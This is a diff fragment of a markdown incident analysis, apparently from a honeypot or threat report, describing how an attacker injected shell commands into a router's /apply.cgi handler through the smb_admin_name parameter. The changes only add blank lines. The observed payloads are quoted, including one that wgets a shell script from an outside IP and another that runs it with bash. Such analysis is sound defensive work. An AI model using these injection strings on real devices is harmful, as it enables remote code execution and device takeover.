@@ -104,14 +104,17 @@ This aligns with:
 
 After authentication, the attacker's behavior escalated significantly.
 
+
 **Targeted Endpoint**
 - `/apply.cgi` (router configuration handler)
+
 
 **Injection Vector**
 The attacker abused the parameter:
 - `usbapps.config.smb_admin_name`
 
 This field was used to inject shell commands into the router’s configuration.
+
 
 **Observed Command Injection**
 
@@ -124,6 +127,7 @@ Example injection format:
 - `admin'whoami'`
 - `admin'wget http://35.159.25.253:8000/a1l4m.sh'`
 - `admin'bash a1l4m.sh'`
+
 
 **Assessment**
 
